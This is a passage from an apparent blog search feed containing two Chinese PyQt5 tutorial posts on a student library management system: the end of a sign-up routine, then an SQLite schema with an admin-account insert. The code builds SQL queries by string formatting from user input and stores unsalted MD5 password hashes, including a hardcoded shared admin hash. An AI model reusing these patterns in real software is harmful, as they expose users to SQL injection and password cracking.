hl &#x3D; hashlib.md5()</span><br><span class="line">                hl.update(password.encode(encoding&#x3D;&#39;utf-8&#39;))</span><br><span class="line">                md5password &#x3D; hl.hexdigest()</span><br><span class="line">                sql &#x3D; &quot;SELECT * FROM user WHERE StudentId&#x3D;&#39;%s&#39;&quot; % (studentId)</span><br><span class="line">                query.exec_(sql)</span><br><span class="line">                if (query.next()):</span><br><span class="line">                    print(QMessageBox.warning(self, &quot;警告&quot;, &quot;该账号已存在,请重新输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">                    return</span><br><span class="line">                else:</span><br><span class="line">                    sql &#x3D; &quot;INSERT INTO user VALUES (&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,0,0,0)&quot; % (</span><br><span class="line">                        studentId, studentName, md5password)</span><br><span class="line">                    db.exec_(sql)</span><br><span class="line">                    db.commit()</span><br><span class="line">                    print(QMessageBox.information(self, &quot;提醒&quot;, &quot;您已成功注册账号!&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">                    self.student_signup_signal.emit(studentId)</span><br><span class="line">                db.close()</span><br><span class="line">                return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; SignUpWidget()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><ul><li>setUpUI用来初始化UI界面</li><li>signUp实现在注册过程中的逻辑以及对数据库的操作，按理说应该把数据库操作单独写一个模块的，不过我很懒…</li><li>注册成功暂时只是把数据插入了数据库，本来应该加上跳转页面之类的操作</li><li>如果觉得黑色的效果很好看的话，大家也可以调用经典的QSSstyle表qdarkstyle<br>##实现效果<br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135437.jpg" alt="Alt text"></li></ul><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135442.jpg" alt="Alt text"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（1）——数据库</title>
    <url>/51f03b47.html</url>
    <content><![CDATA[<p>PS:由于CSDN太多广告所以弃用了，搬运到了自己的博客</p><h2><span id="pxie-zai-qian-mian">写在前面</span><a href="#pxie-zai-qian-mian" class="header-anchor">#</a></h2><p>这学期的数据库大作业要求是做一个简单的图书馆管理系统，刚好之前看过Qt，就打算用Qt来写了，博客记录一些重要的模块和思路</p><h2><span id="pyao-qiu">要求</span><a href="#pyao-qiu" class="header-anchor">#</a></h2><p>编写一个图书管理系统，要求具有以下内容：</p><ul><li>存储图书信息、采购和淘汰情况、租借情况</li><li>实现图书采购、淘汰、租借功能。</li><li>实现图书信息、采购和淘汰、库存、和租借情况查询</li><li>实现图书的采购、库存、淘汰、租借情况等统计</li></ul><p>这是要实现的基本功能，当然我觉得做好的话还可以加上读者推荐书目，我喜欢，收藏书目之类的功能</p><a id="more"></a><h2><span id="pda-zhi-si-lu">大致思路</span><a href="#pda-zhi-si-lu" class="header-anchor">#</a></h2><p>作为一个管理系统，自然要实现管理员和学生两个方面的内容</p><ul><li>首先需要登录和注册页面</li><li>对于管理员，在管理员的管理页面上，会实现图书的采购，淘汰，库存，租借情况查询及统计</li><li>对于学生，要实现图书的借阅、归还、租借情况查询</li></ul><h2><span id="pshu-ju-ku">数据库</span><a href="#pshu-ju-ku" class="header-anchor">#</a></h2><p>使用Sqlite3轻量级数据库作为系统的数据库</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE User (</span><br><span class="line">  StudentId     CHAR(10) UNIQUE NOT NULL,</span><br><span class="line">  Name          VARCHAR(20),</span><br><span class="line">  Password      CHAR(32)        NOT NULL,</span><br><span class="line">  IsAdmin       BIT DEFAULT 0,</span><br><span class="line">  TimesBorrowed INT DEFAULT 0,</span><br><span class="line">  NumBorrowed   INT DEFAULT 0</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">CREATE TABLE Book (</span><br><span class="line">  BookName     VARCHAR(30) NOT NULL,</span><br><span class="line">  BookId       CHAR(6)     NOT NULL,</span><br><span class="line">  Auth         VARCHAR(20) NOT NULL,</span><br><span class="line">  Category     VARCHAR(10) DEFAULT NULL,</span><br><span class="line">  Publisher    VARCHAR(30) DEFAULT NULL,</span><br><span class="line">  PublishTime  DATE,</span><br><span class="line">  NumStorage   INT         DEFAULT 0,</span><br><span class="line">  NumCanBorrow INT         DEFAULT 0,</span><br><span class="line">  NumBorrowed  INT         DEFAULT 0</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">CREATE TABLE User_Book (</span><br><span class="line">  StudentId   CHAR(10) UNIQUE NOT NULL,</span><br><span class="line">  BookId      CHAR(6)         NOT NULL,</span><br><span class="line">  BorrowTime  DATE,</span><br><span class="line">  ReturnTime  DATE,</span><br><span class="line">  BorrowState BIT DEFAULT 0</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">CREATE TABLE BuyOrDrop (</span><br><span class="line">  BookId    CHAR(6) NOT NULL,</span><br><span class="line">  Time      DATE,</span><br><span class="line">  BuyOrDrop BIT DEFAULT 0,</span><br><span class="line">  Number    INT DEFAULT 0</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">INSERT INTO User VALUES (&#39;0000000000&#39;, &#39;管理员&#39;, &#39;f9687b82c237c8868a92ffa548c0a16a&#39;, 1, 0, 0);</span><br></pre></td></tr></table></figure><blockquote><p>所有管理员使用同一账户 ，password使用md5加密</p></blockquote><h3><span id="puser-biao">User表</span><a href="#puser-biao" class="header-anchor">#</a></h3><ul><li>StudentId：学号</li><li>Name：姓名</li><li>Password：密码</li><li>IsAdmin：是否为管理员</li><li>TimesBorrowed：借阅次数</li><li>NumBorrowed：已借书数量<br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135905.jpg" alt="Alt text"></li></ul><h3><span id="pbook-biao">Book表</span><a href="#pbook-biao" class="header-anchor">#</a></h3><ul><li>BookName：书名</li><li>BookId：书号</li><li>Auth：作者</li><li>CateGory：分类</li><li>Publisher：出版社</li><li>PublishTime：出版时间</li><li>NumStorage：库存量</li><li>NumCanBorrowed：可借量</li><li>NumBorrowed：被借阅次数</li></ul><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135416.jpg" alt="Alt text"></p><h3><span id="puser-book-biao">User_Book表</span><a href="#puser-book-biao" class="header-anchor">#</a></h3><p>分别为学号，书号，借阅时间，归还时间，借阅状态</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135421.jpg" alt="Alt text"></p><h3><span id="pbuyordrop-biao">BuyOrDrop表</span><a href="#pbuyordrop-biao" class="header-anchor">#</a></h3><p>分别为书号，添加或淘汰时间，添加还是淘汰，数量<br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135425.jpg" alt="Alt text"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
</search>
